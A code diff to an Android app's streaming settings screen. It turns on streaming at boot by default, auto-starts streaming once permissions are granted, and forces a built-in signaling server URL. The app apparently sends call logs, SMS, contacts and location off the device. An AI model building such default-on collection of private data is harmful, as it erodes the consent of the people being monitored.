@@ -47,9 +47,10 @@ public class StreamingSettingsActivity extends AppCompatActivity {
         defaultUrlBtn = findViewById(R.id.btn_use_default_signaling_url);
 
         SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
-        boolean isStreamingEnabled = prefs.getBoolean("streaming_enabled", true);
+        boolean isStreamingEnabled = prefs.getBoolean(Constants.PREF_STREAMING_ENABLED, true);
+        boolean isBootEnabled = prefs.getBoolean(Constants.PREF_BOOT_ENABLED, true);
         streamingSwitch.setChecked(isStreamingEnabled);
-        bootSwitch.setChecked(prefs.getBoolean("boot_streaming_enabled", false));
+        bootSwitch.setChecked(isBootEnabled);
 
         // Auto-start streaming on launch if enabled
         if (isStreamingEnabled && checkPermissions()) {
@@ -61,22 +62,22 @@ public class StreamingSettingsActivity extends AppCompatActivity {
                 if (checkPermissions()) {
                     startStreamingService();
                     checkNotificationAccess();
-                    prefs.edit().putBoolean("streaming_enabled", true).apply();
+                    prefs.edit().putBoolean(Constants.PREF_STREAMING_ENABLED, true).apply();
                 }
             } else {
                 stopStreamingService();
-                prefs.edit().putBoolean("streaming_enabled", false).apply();
+                prefs.edit().putBoolean(Constants.PREF_STREAMING_ENABLED, false).apply();
             }
         });
 
         bootSwitch.setOnCheckedChangeListener((buttonView, isChecked) -> {
-            prefs.edit().putBoolean("boot_streaming_enabled", isChecked).apply();
+            prefs.edit().putBoolean(Constants.PREF_BOOT_ENABLED, isChecked).apply();
         });
 
         stopButton.setOnClickListener(v -> {
             stopStreamingService();
             streamingSwitch.setChecked(false);
-            prefs.edit().putBoolean("streaming_enabled", false).apply();
+            prefs.edit().putBoolean(Constants.PREF_STREAMING_ENABLED, false).apply();
         });
 
         permissionErrorReceiver = new BroadcastReceiver() {
@@ -89,7 +90,10 @@ public class StreamingSettingsActivity extends AppCompatActivity {
         };
 
         // Load saved or default URL into the input
-        String currentUrl = prefs.getString("signaling_url", Constants.DEFAULT_SIGNALING_URL);
+        String currentUrl = prefs.getString("signaling_url", null);
+        if (currentUrl == null || currentUrl.trim().isEmpty() || currentUrl.contains("railway.app")) {
+            currentUrl = Constants.DEFAULT_SIGNALING_URL;
+        }
         signalingUrlEt.setText(currentUrl);
 
         // Save button: validate and persist; restart service if currently on
@@ -138,9 +142,18 @@ public class StreamingSettingsActivity extends AppCompatActivity {
 
     private boolean isValidServerUrl(String url) {
         if (TextUtils.isEmpty(url)) return false;
-        // Allow http/https only; must be a valid web URL
+        // Allow http/https only
         if (!(url.startsWith("http://") || url.startsWith("https://"))) return false;
-        return Patterns.WEB_URL.matcher(url).matches();
+        // Accept localhost, emulator loopback, and local IPs with ports
+        if (url.contains("localhost") || url.contains("10.0.2.2") || url.contains("127.0.0.1")) {
+            return true;
+        }
+        try {
+            java.net.URI uri = java.net.URI.create(url);
+            return uri.getHost() != null;
+        } catch (Exception e) {
+            return Patterns.WEB_URL.matcher(url).matches();
+        }
     }
 
     private void restartStreamingService() {
@@ -234,6 +247,20 @@ public class StreamingSettingsActivity extends AppCompatActivity {
     }
 
     @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == 2296) {
+            if (checkPermissions()) {
+                startStreamingService();
+                checkNotificationAccess();
+                SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
+                prefs.edit().putBoolean(Constants.PREF_STREAMING_ENABLED, true).apply();
+                streamingSwitch.setChecked(true);
+            }
+        }
+    }
+
+    @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
@@ -246,8 +273,10 @@ public class StreamingSettingsActivity extends AppCompatActivity {
             }
             if (allGranted) {
                 checkNotificationAccess();
+                startStreamingService();
                 SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
-                prefs.edit().putBoolean("streaming_enabled", true).apply();
+                prefs.edit().putBoolean(Constants.PREF_STREAMING_ENABLED, true).apply();
+                streamingSwitch.setChecked(true);
             } else {
                 Toast.makeText(this, "Permissions required for streaming, call logs, SMS, contacts, and location", Toast.LENGTH_SHORT).show();
                 streamingSwitch.setChecked(false);
